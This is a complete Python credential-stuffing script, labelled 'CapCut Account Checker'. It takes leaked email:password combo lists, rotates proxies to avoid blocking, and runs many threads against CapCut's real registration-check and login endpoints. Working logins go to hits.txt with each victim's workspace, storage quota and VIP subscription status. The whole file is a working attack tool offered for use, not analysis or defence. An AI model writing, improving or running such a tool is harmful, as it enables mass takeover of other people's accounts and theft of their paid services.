import requests
import json
import threading
import random
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable warnings
requests.packages.urllib3.disable_warnings()

# Colors
class Colors:
    GREEN = '\033[92m'     # HIT
    RED = '\033[91m'       # BAD
    YELLOW = '\033[93m'    # ERROR / UNKNOWN
    BLUE = '\033[94m'      # INFO
    MAGENTA = '\033[95m'   # BLOCKED
    RESET = '\033[0m'

# Thread-safe counters
lock = threading.Lock()
checked = 0
hits = 0

def load_list(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}⚠️ File not found: {file_path}{Colors.RESET}")
        return []

def save_hit(account_line):
    """Auto-save valid (HIT) accounts to hits.txt"""
    with lock:
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(account_line + "\n")

def update_progress(result_text, is_hit=False):
    """Update total counters and print formatted line"""
    global checked, hits
    with lock:
        checked += 1
        if is_hit:
            hits += 1
        print(result_text)
        print(f"{Colors.BLUE}[STATS]{Colors.RESET} Checked: {checked} | Hits: {hits}\r", end="")

def check_account(email, password, proxy=None):
    session = requests.Session()
    proxies = None
    if proxy:
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    try:
        # STEP 1: Check if email registered
        url_check = "https://www.capcut.com/passport/web/user/check_email_registered?aid=348188&account_sdk_source=web&sdk_version=2.1.2-abroad-beta.0&language=en"
        data = f"mix_mode=1&email={email}&fixed_mix_mode=1"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/signup",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        r1 = session.post(url_check, data=data, headers=headers, proxies=proxies, verify=False, timeout=10)
        if "\"is_registered\":0" in r1.text:
            update_progress(f"{Colors.RED}[BAD]{Colors.RESET} {email}:{password} -> Not registered")
            return

        # STEP 2: Login
        csrf_token = session.cookies.get("passport_csrf_token", "")
        url_login = "https://www.capcut.com/passport/web/email/login/?aid=348188&account_sdk_source=web&sdk_version=2.1.2-abroad-beta.0&language=en"
        login_data = f"mix_mode=1&email={email}&password={password}&fixed_mix_mode=1"
        headers_login = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Origin": "https://www.capcut.com",
            "Referer": "https://www.capcut.com/login",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-tt-passport-csrf-token": csrf_token
        }

        r2 = session.post(url_login, data=login_data, headers=headers_login, proxies=proxies, verify=False, timeout=10)

        if "user_id" in r2.text:
            js = r2.json()
            user_id = js.get("user_id")
            app_id = js.get("app_id")
            info = get_account_info(session, user_id, app_id, proxies)
            hit_line = f"{email}:{password} | {info}"
            update_progress(f"{Colors.GREEN}[HIT]{Colors.RESET} {hit_line}", is_hit=True)
            save_hit(hit_line)
        elif "blocked" in r2.text:
            update_progress(f"{Colors.MAGENTA}[BLOCKED]{Colors.RESET} {email}:{password}")
        elif "1009" in r2.text or "error" in r2.text:
            update_progress(f"{Colors.RED}[BAD]{Colors.RESET} {email}:{password} -> Wrong password")
        else:
            update_progress(f"{Colors.YELLOW}[UNKNOWN]{Colors.RESET} {email}:{password}")

    except Exception as e:
        update_progress(f"{Colors.YELLOW}[ERROR]{Colors.RESET} {email}:{password} -> {str(e)}")

def get_account_info(session, user_id, app_id, proxies=None):
    try:
        ws_url = "https://edit-api-sg.capcut.com/cc/v1/workspace/get_user_workspaces"
        ws_payload = {"cursor": "0", "count": 100, "need_convert_workspace": True}
        ws_headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        r_ws = session.post(ws_url, json=ws_payload, headers=ws_headers, proxies=proxies, verify=False, timeout=10)
        ws_json = r_ws.json()

        workspaces = ws_json.get("workspaces", [])
        workspace_count = len(workspaces)
        region = workspaces[0].get("region", "N/A") if workspaces else "N/A"
        quota = workspaces[0].get("quota", 0) if workspaces else 0
        quota_gb = round(quota / (1024 ** 3), 2)

        sub_url = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"
        sub_payload = {"aid": str(app_id), "scene": "vip"}
        sub_headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        r_sub = session.post(sub_url, json=sub_payload, headers=sub_headers, proxies=proxies, verify=False, timeout=10)
        sub_json = r_sub.json()
        sub_data = sub_json.get("data", {})

        vip = sub_data.get("subscribe_type", "None")
        days_left = sub_data.get("can_free_trial_days", 0)

        return f"Workspaces: {workspace_count} | Region: {region} | Quota: {quota_gb}GB | VIP: {vip} | DaysLeft: {days_left}"
    except Exception:
        return "Basic info only"

def single_account_mode():
    email = input("Enter email: ").strip()
    password = input("Enter password: ").strip()
    check_account(email, password)

def combo_mode():
    combo_file = input("Enter combo file path: ").strip()
    proxy_file = input("Enter proxy file path (optional): ").strip()

    combos = load_list(combo_file)
    proxies = load_list(proxy_file) if proxy_file else []
    proxy_pool = cycle(proxies) if proxies else None

    print(f"\nLoaded {len(combos)} combos | {len(proxies)} proxies\n")
    threads = int(input("Threads (default 20): ").strip() or 20)
    print(f"{Colors.BLUE}Checking started...{Colors.RESET}\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for combo in combos:
            if ":" not in combo:
                continue
            email, password = combo.split(":", 1)
            proxy = next(proxy_pool) if proxy_pool else None
            futures.append(executor.submit(check_account, email, password, proxy))

        for _ in as_completed(futures):
            pass

def main():
    print(f"{Colors.BLUE}CapCut Account Checker {Colors.RESET}")
    print("1. Check single account")
    print("2. Check combo file")
    choice = input("Choose mode (1/2): ").strip()

    if choice == "1":
        single_account_mode()
    elif choice == "2":
        combo_mode()
    else:
        print(f"{Colors.RED}Invalid option!{Colors.RESET}")

if __name__ == "__main__":
    main()